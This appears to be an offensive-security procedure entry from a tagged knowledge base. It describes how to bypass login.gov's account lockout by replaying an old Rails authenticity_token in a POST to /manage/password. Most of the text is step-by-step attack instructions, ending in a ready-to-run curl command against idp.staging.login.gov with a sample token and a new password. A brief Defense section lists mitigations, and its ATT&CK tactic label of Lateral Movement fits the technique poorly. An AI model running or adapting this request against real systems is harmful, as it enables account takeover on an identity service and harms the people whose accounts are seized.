---
tags:
  - lockout-bypass
  - auth-bypass
  - csrf-token-reuse
type: procedure
tools: []
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/post-manage-password-bypass-lockout]]'
platforms:
  - Web
techniques:
  - '[[Account Manipulation]]'
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: b351dd9a-77a2-412e-823f-45f0fb20fd24
created_at: '2025-12-14T17:24:45.488Z'
updated_at: '2025-12-14T17:24:45.488Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Account Manipulation]]'
  - '[[Exploit Public-Facing Application]]'
---
# Bypass-Account-Lockout-with-Old-Authenticity-Token

## Summary

This procedure bypasses account lockouts (e.g., 10-minute delays after failed logins) in login.gov by reusing an old authenticity_token in a POST request to the password management endpoint.

## Description

After failed login attempts trigger a lockout, the system normally enforces a delay before allowing changes. However, by capturing an authenticity_token from a prior session and including it in a POST to /manage/password, the attacker can update the password immediately. This exploits improper validation of token freshness in the Ruby on Rails application. Prerequisites: Session with token capture, account in locked state. Expected outcome: Password change without delay.

## Requirements

1. Old authenticity_token from previous form/session
2. HTTP client for POST requests (e.g., curl)
3. Knowledge of account's current state (locked)

## Defense

Defensive measures and detection strategies:

- Validate authenticity_token expiration and tie to session
- Enforce lockout checks before any password updates
- Log and alert on reused or old CSRF tokens

## Objectives

1. Trigger and confirm account lockout
2. Reuse old token to bypass enforcement
3. Update password during lockout period

## Instructions

### Step 1: Trigger Lockout

**Context**: Simulate failed logins to activate the 10-minute lockout.

**Instructions**: Attempt multiple incorrect logins to the account via the login form.

> Expected output: Error message indicating temporary lockout.

### Step 2: Capture Old Token

**Context**: Obtain an authenticity_token from a prior legitimate session.

**Instructions**: From a previous page load (e.g., /manage/password), inspect the form for the hidden authenticity_token field and copy its value (e.g., bGs%2FBZHewYdpRsyPIe108KMc2sR1mK9SL1bbi0X%2F9IYZDJ%2Bh3SpUN79l84qk%2FXZS1%2Fx6Nd9VBVR%2BNCR2a95NZQ%3D%3D).

> Expected output: Encoded token string.

### Step 3: Execute Bypass Request

**Context**: Send POST with old token to update password.

**Command** ([[commands/post-manage-password-bypass-lockout]]):
```bash
curl -X POST https://idp.staging.login.gov/manage/password \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "utf8=%E2%9C%93&_method=patch&authenticity_token=bGs%2FBZHewYdpRsyPIe108KMc2sR1mK9SL1bbi0X%2F9IYZDJ%2Bh3SpUN79l84qk%2FXZS1%2Fx6Nd9VBVR%2BNCR2a95NZQ%3D%3D&update_user_password_form[password]=test_?123+&commit=Update"
```

> This sends the request with the old token, bypassing lockout. Expected output: Success response with password updated.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Account Manipulation]] Account Manipulation
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/post-manage-password-bypass-lockout]]

## Tools Used

- None

## Tags

- [[lockout-bypass]]
- [[auth-bypass]]
- [[csrf-token-reuse]]
